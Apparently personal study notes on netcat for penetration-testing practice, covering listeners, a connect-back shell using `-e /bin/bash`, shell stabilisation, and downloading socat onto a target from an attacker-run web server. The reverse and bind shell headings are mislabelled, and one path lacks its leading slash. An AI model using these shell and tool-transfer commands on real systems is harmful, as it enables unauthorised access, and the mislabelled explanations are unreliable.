Also referred to as `nc`

Can serve as a client that connects to a listening port or as a server that listens to a port of your choice.

Supports both [[TCP]] and [[UDP]]

```bash
nc IP_ADDRESS PORT
```

![[Pasted image 20260505232302.png]]

## Using `nc` as [[Reverse Shell]]:

```bash
nc -lvnp PORT_NUMBER
```

`-l` listener
`-v` verbose output
`-n` do not resolve names or use [[DNS]]
`-p` specify port

## Using `nc` as [[Bind Shell]]:

```bash
nc IP_ADDRESS PORT_NUMBER -e /bin/bash
```

## Stabilising `nc` connections:

- Use python (only applicable to linux boxes as they are commonly pre-installed):
	- `python -c 'import pty;pty.spawn("bin/bash")'`
		- Uses python to spawn a better featured bash
		- might need to specify python version on some instances like `python2` or `python3`
	- `export TERM=xterm` gives us access to terminal commands like `clear`
	- Background the shell using `Ctrl+Z`
	- Run `stty raw -echo; fg` on our own system 
		- turns off our own terminal echo
		- foregrounds the shell
		- if the shell dies, any input in our own terminal will not be visible. run `reset` to fix this
- use `rlwrap`
	- This gives us access to history, tab autocompletion, and the arrow keys upon receiving shell.
	- needs to be installed `sudo apt install rlwrap`
	- `rlwrap nc -lvnp PORT_NUMBER`
- use [[socat]]
	- only limited to linux boxes as `socat` has the same stability as `nc` on a windows shell
	- use `nc` as a stepping stone to using `socat`
	- first step is to transfer a `socat` static library to the target machine
		- run `sudo python3 -m http.server 80` to run an [[http]] server on port 80
		- run `nc` shell to download the file on the target machine
			- `wget <LOCAL-IP>/socat -O /tmp/socat` for linux
			- `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe` for windows
